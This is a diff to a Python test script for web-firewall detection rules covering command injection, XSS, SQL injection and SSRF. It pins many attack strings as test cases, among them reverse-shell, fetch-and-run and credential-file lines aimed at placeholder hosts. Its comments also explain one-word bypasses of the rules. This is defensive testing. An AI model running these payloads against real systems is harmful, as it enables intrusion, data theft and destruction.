@@ -169,23 +169,71 @@ def main():
     # byte-content guard (append-one-byte bypass), and the log tier must
     # carry the merged command list for mid-value recall.
     check(bp.startswith("^"), "vn_rce_0007 block pattern is value-anchored (^)")
-    check("(?!(?:[\\s\\S]){0,50}" not in bp and "(?!(?:[\\s\\S]){0,50}" not in lp,
-          "no byte-content suppressor in either rce pattern")
+    # v19: the v17 check above only recognised ONE literal spelling of the
+    # suppressor, so it never saw the English-filler guard "(?!\s*(?:the|is|...)"
+    # that shipped in both rce patterns — and that guard is exactly as much of
+    # a bypass switch as the removed suppressor was (';mkfs the /dev/sda' and
+    # ';rm the -rf /' both passed because of it). Generalise the assertion: any
+    # negative lookahead that is followed by attacker-controlled byte classes
+    # must appear only inside the whitelisted filler guard, and the filler guard
+    # must cover the prose-colliding command list ONLY.
+    FILLER = r"(?!\s*(?:the|"
+    for rid, pat in (("vn_rce_0007", bp), ("vn_rce_0025", lp)):
+        # Every negative lookahead in the pattern, scanned rather than
+        # pattern-matched, so a new spelling cannot slip past.
+        looks, i = [], 0
+        while True:
+            j = pat.find("(?!", i)
+            if j < 0:
+                break
+            depth, k = 0, j
+            while k < len(pat):
+                if pat[k] == "(":
+                    depth += 1
+                elif pat[k] == ")":
+                    depth -= 1
+                    if depth == 0:
+                        break
+                k += 1
+            looks.append(pat[j:k + 1])
+            i = k + 1
+        # "(?![A-Za-z])" after a version digit is a token-boundary assertion,
+        # not a payload suppressor: it stops "web2" matching "web", and it
+        # cannot be widened by anything the attacker appends. Whitelisted
+        # explicitly so the general check above stays strict.
+        ALLOWED = ("(?![A-Za-z])",)
+        leftover = [o for o in looks
+                    if not o.startswith(FILLER) and o not in ALLOWED]
+        check(not leftover,
+              f"{rid}: no byte suppressor other than the whitelisted filler "
+              f"guard ({leftover or 'ok'})")
+    # The guard must not creep back onto the commands with no English
+    # collision: those six were cleared by inserting the word 'the'.
+    NOGUARD = ("mkfs", "crontab", "nohup", "pkill", "base64", "openssl")
+    head = ""
+    if FILLER in bp:
+        head = bp[bp.index(FILLER):].split(")")[0]
+    leaked = [c for c in NOGUARD
+              if re.search(r"(?:\||\()" + re.escape(c) + r"\b", head)]
+    check(not leaked,
+          f"filler guard applies only to prose-colliding commands ({leaked or 'ok'})")
     missing_merged = [c for c in BLOCK_CMDS if c not in lp]
     check(not missing_merged,
           f"log tier merges block commands ({missing_merged or 'ok'})")
     for rid, pat in (("vn_rce_0007", bp), ("vn_rce_0025", lp)):
         uris = regex_values(by[rid]["matcher"])
         check(NEW_EX in uris, f"{rid} keeps the admin-path exemption")
-    check(d.get("version") == 18, f"file version == 18 (got {d.get('version')})")
+    check(d.get("version") == 19, f"file version == 19 (got {d.get('version')})")
     check(len(d["rules"]) == 27, f"27 rules (got {len(d['rules'])})")
-    check(by["vn_rce_0007"]["version"] >= 7, "vn_rce_0007 v7 (anchored, suppressor gone)")
-    check(by["vn_rce_0025"]["version"] >= 2, "vn_rce_0025 v2 (merged command list)")
+    check(by["vn_rce_0007"]["version"] >= 8, "vn_rce_0007 v8 (&& separator, guard split)")
+    check(by["vn_rce_0025"]["version"] >= 3, "vn_rce_0025 v3 (&& separator)")
     check(by["vn_sqli_0001"]["version"] >= 8, "vn_sqli_0001 v8 (comment/line-comment separators)")
     check(by["vn_sqli_0002"]["version"] >= 7, "vn_sqli_0002 v7 (line-comment gaps closed)")
     check(by["vn_sqli_0004"]["version"] >= 6, "vn_sqli_0004 v6 (sleep-prefix/info_schema prose fixed)")
-    check(by["vn_xss_0005"]["version"] >= 5, "vn_xss_0005 v5 (event families added)")
-    check(by["vn_xss_0006"]["version"] >= 7, "vn_xss_0006 v7 (verb-table redesign)")
+    check(by["vn_xss_0004"]["version"] >= 6, "vn_xss_0004 v6 (URI branch added)")
+    check(by["vn_xss_0005"]["version"] >= 6, "vn_xss_0005 v6 (handler table 92 -> 116)")
+    check(by["vn_xss_0006"]["version"] >= 8, "vn_xss_0006 v8 (code-shape reachability fixed)")
+    check(by["vn_rce_0009"]["version"] >= 6, "vn_rce_0009 v6 (dotted-host requirement)")
     check(by["vn_ssrf_0021"]["version"] >= 4, "vn_ssrf_0021 v4 (userinfo bypass closed)")
 
     bx = re.compile(bp, re.I)
@@ -207,9 +255,26 @@ def main():
     sweep_fail = []
     sweep_total = 0
     block_set = set(BLOCK_CMDS)
+    NOGUARD_SET = {"mkfs", "crontab", "nohup", "pkill", "base64", "openssl"}
     for cmd in BLOCK_CMDS + NAMED_CMDS + BARE6:
         plain = cmd.replace("[0-9.]*", "")
-        if plain in block_set:
+        if plain in NOGUARD_SET:
+            # v19: the filler guard was dropped here on purpose — these six
+            # command names are not English words, so the guard bought no
+            # precision and cost a one-word bypass (';mkfs the /dev/sda').
+            # Their prose forms now hit at the block tier; asserted, not
+            # ignored, so the cost of the choice stays visible.
+            # The block tier is value-anchored (^), so only the forms that
+            # START with the separator can reach it; the mid-value ones stay
+            # clear exactly as before and are pinned so that stays true.
+            cases = [(f"; {plain} is a test", "block"),
+                     (f"; {plain} that file", "block"),
+                     (f"; {plain} 777 目录", "block"),
+                     (f"wait; {plain} the docs", None),
+                     (f"然后; {plain} 看看", None),
+                     (f"上传后; {plain} 777 runtime目录就好了", None),
+                     (f"备注; {plain} 看看", None)]
+        elif plain in block_set:
             cases = [(f"; {plain} is a test", None),
                      (f"; {plain} that file", None),
                      (f"wait; {plain} the docs", None),
@@ -248,6 +313,19 @@ def main():
     for s in review_fps:
         check(tier(s) is None, f"FP clear: {s!r}")
 
+    # Accepted residual of v19, asserted rather than ignored: for the commands
+    # whose names collide with English prose the filler guard survives, and it
+    # is a byte-level negative condition — one inserted word clears the whole
+    # payload. This is the price of not blocking "; mount the share", and it
+    # is why the guard was dropped from the six commands where it bought
+    # nothing (pinned as block hits in the block-tier table).
+    v19_residual = [
+        "; rm the -rf /", "; ssh the server now", "; mount the share",
+        "; chmod the file", "; telnet the router", "; cp the sources",
+    ]
+    for s in v19_residual:
+        check(tier(s) is None, f"v19 accepted residual (guard holds): {s!r}")
+
     review_attacks = [
         ("; chmod 777 /tmp/x", "block"), ("; ssh user@host", "block"),
         ("; scp file host:/tmp", "block"), ("; cp a b", "block"),
@@ -274,13 +352,24 @@ def main():
         "; ftp 10.0.0.1", "; mount -t nfs 10.0.0.1:/x /mnt", "; umount /var/www",
         "; crontab -e", "; nohup ./x.sh &", "; pkill -f nginx", "; base64 /etc/shadow",
         "| ssh root@1.2.3.4", "$(rm -rf /)", ";chown www.www /x",
-        "; mount the share",  # NO — prose, see FP table; placeholder removed below
+        # v19 separator set: '&' is the connector attackers reach for after
+        # ';', and every one of these used to walk past a block rule.
+        "&&rm -rf /", "&& rm -rf /", "&chmod 777 /tmp/x", "&& chmod 777 /tmp/x",
+        "&& nc -e /bin/sh 1.2.3.4 4444", "&& openssl s_client",
+        # v19 filler-guard split: these six no longer carry the English-word
+        # guard, because for them it was a one-word bypass and no precision.
+        "; mkfs the /dev/sda", "; crontab the -e", "; pkill the -f nginx",
+        "; nohup the ./x.sh &", "; base64 the -d", "; openssl the enc",
     ]
-    block_attacks = [s for s in block_attacks if s != "; mount the share"]
     for s in block_attacks:
         check(tier(s) == "block", f"block hits: {s!r}")
 
     print("== log-tier attacks (must be 'log', never 'block') ==")
+    # v19: the log tier gained the same separator set, which is where its
+    # recall jump comes from — '&&cat /etc/passwd' matches neither tier before.
+    for s in ["&&cat /etc/passwd", "a&&cat /etc/passwd", "&&wget http://e.example/x.sh|sh",
+              "&& curl http://e.example/x.sh", "x && id"]:
+        check(tier(s) == "log", f"log hits: {s!r}")
     log_attacks = [
         "; cat /etc/passwd", "; head -5 /etc/shadow", "; tail /var/log/auth.log",
         "; curl http://evil.example/x.sh", "; wget http://evil.example/payload",
@@ -584,6 +673,136 @@ def main():
             ("javascript:alert(1)", True),
             ("please javascript:confirm your email address", False),
         ], "vn_xss_0006/uri")
+
+    # v19 reachability pins. v16 put the code-shape branches behind a
+    # zero-width lookahead pinned to the first character after the colon, so
+    # one space of padding disabled the whole rule. These are the exact shapes
+    # that slipped through, plus the template-literal call that a naive
+    # "identifier then (" rewrite loses.
+    pin(re.compile(xss6_args, re.I), [
+        ("javascript: alert(1)", True),
+        ("javascript:  alert(1)", True),
+        ("javascript:\nalert(1)", True),
+        ("javascript:globalThis.alert(1)", True),
+        ("javascript:String.fromCharCode(97)", True),
+        ('javascript:atob("YWxlcnQoMSk=")()', True),
+        ("javascript:this.foo()", True),
+        ("javascript:(alert(1))", True),
+        ("javascript:!alert(1)", True),
+        ("javascript:alert`1`", True),
+        ("javascript:window.location=url", True),
+        ("data:text/html,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", True),
+        # Accepted cost of matching code shape: two sentences that quote code.
+        ("how to javascript: fetch( data ) from a worker in 2024?", True),
+        ("用 javascript: document.write( 会阻塞渲染，建议用 innerHTML", True),
+        # Regression guards for the shape that must stay clear.
+        ("javascript: the language of the web", False),
+        ("javascript: location of the config file", False),
+        ("javascript: self-service portal (SSO)", False),
+        ("the javascript: scheme is deprecated in modern browsers", False),
+    ], "vn_xss_0006/v19")
+
+    # v19 handler-table growth. "<body onpageshow=alert(1)>" is a working
+    # chain in every current browser and the table did not list it.
+    pin(re.compile(args_pattern(by["vn_xss_0005"]), re.I), [
+        ("<body onpageshow=alert(1)>", True),
+        ("<div onhashchange=alert(1)>", True),
+        ("<body onoffline=alert(1)>", True),
+        ("<iframe onmessage=alert(1)>", True),
+        ("<body onunload=alert(1)>", True),
+        ("<div onstorage=alert(1)>", True),
+        ("<div onpopstate=alert(1)>", True),
+        ("<div onbeforeunload=alert(1)>", True),
+        ("<body onafterprint=alert(1)>", True),
+        ("<div onbeforeprint=alert(1)>", True),
+        ("<body onlanguagechange=alert(1)>", True),
+        ("<div onmessageerror=alert(1)>", True),
+        ("<div onpointerrawupdate=alert(1)>", True),
+        ("<div onpageswap=alert(1)>", True),
+        ("<div onpagereveal=alert(1)>", True),
+        ("<div onpagehide=alert(1)>", True),
+        ("<body ononline=alert(1)>", True),
+        ("<div onunhandledrejection=alert(1)>", True),
+        ("<div onwebkitanimationend=alert(1)>", True),
+        ("<div onwebkitanimationiteration=alert(1)>", True),
+        ("<div onwebkitanimationstart=alert(1)>", True),
+        ("<div onwebkittransitionend=alert(1)>", True),
+        ("<div onanimationcancel=alert(1)>", True),
+        ("turn on+off switch in the panel", False),
+        ("讨论 onload 属性的用法", False),
+        ("The onmouseover handler fires twice", False),
+        ("iframe 的 onload 一直不触发", False),
+        ("请问 onclick 事件怎么在 Vue 里绑定", False),
+    ], "vn_xss_0005/v19")
+
+    # vn_xss_0004 had NO behavioural pins before v19 — only a compile check.
+    xss4_args = args_pattern(by["vn_xss_0004"])
+    xss4_uri = uri_attack_pattern(by["vn_xss_0004"])
+    pin(re.compile(xss4_args, re.I), [
+        ("<script>alert(1)</script>", True),
+        ("<script src=x>", True),
+        ("<script/>", True),
+        ("<script\n>", True),
+        # No tag terminator, so not a tag.
+        ("<scripture of the book", False),
+        ("<scriptfoo", False),
+        ("<script", False),
+        ("<div class=container>", False),
+        ("3 < 5 and 5 > 3", False),
+        ("a <= b 比较表达式", False),
+        # Accepted FP: a post that quotes the tag as an example.
+        ("how to disable javascript <script> blocking in CSP?", True),
+    ], "vn_xss_0004")
+    check(xss4_uri == xss4_args,
+          "vn_xss_0004 URI and Args branches share one value (v19)")
+    if xss4_uri:
+        pin(re.compile(xss4_uri, re.I), [
+            ("/<script>alert(1)</script>", True),
+            ("/static/js/app.js", False),
+            ("/docs/script/overview.html", False),
+        ], "vn_xss_0004/uri")
+
+    # vn_rce_0008 also had no behavioural pins before v19.
+    pin(re.compile(args_pattern(by["vn_rce_0008"]), re.I), [
+        ("system($_GET['c'])", True),
+        ("exec('ls')", True),
+        ("shell_exec('ls')", True),
+        ("passthru('ls')", True),
+        ("proc_open('ls',[],$p)", True),
+        ("create_function('$a','return $a;')", True),
+        ("call_user_func([$o,'m'],$a)", True),
+        ("popen('ls',$r)", True),
+        # Word boundary: assert_options( and System.load() must stay clear.
+        ("assert_options(ASSERT_ACTIVE,1)", False),
+        ("System.load()", False),
+        ("The execute() function is deprecated", False),
+        ("python -c 'print(1)'", False),
+        # Accepted miss, log tier: the \\b cannot sit before an underscore.
+        ("pcntl_exec('/bin/sh')", False),
+    ], "vn_rce_0008")
+
+    # vn_rce_0009 likewise had none; v19 replaced the bare scheme with a
+    # dotted-host requirement and added the jar:<scheme> shape.
+    pin(re.compile(args_pattern(by["vn_rce_0009"]), re.I), [
+        ("gopher://e.example/_", True),
+        ("GOPHER://e.example/_", True),
+        ("jar://e.example/x.jar", True),
+        ("jar:http://e.example/x.jar!/", True),
+        ("jar:ftp://e.example/x.jar!/", True),
+        ("dict://1.2.3.4:11211/stats", True),
+        # Prose and ops usage that the old bare "(?:gopher|dict|jar)://"
+        # blocked, and that the dotted-host requirement now clears.
+        ("dict://localhost:11211/stats for memcached debugging", False),
+        ("python zipfile:// vs jar:// packaging", False),
+        ("jar:// 不是标准 URL，见 Java URLClassLoader", False),
+        ("gopher://localhost/_", False),
+        ("RFC 1711 定义了 gopher 协议", False),
+        ("https://jar-downloads.example.com/x.jar", False),
+        ("a jar of pickles", False),
+        ("the dict protocol on localhost", False),
+        # Accepted miss: no host to validate.
+        ("jar:file:///tmp/x.jar", False),
+    ], "vn_rce_0009")
 
     pin(re.compile(args_pattern(by["vn_ssrf_0021"]), re.I), [
         ("http://169.254.169.254/latest/meta-data/", True),
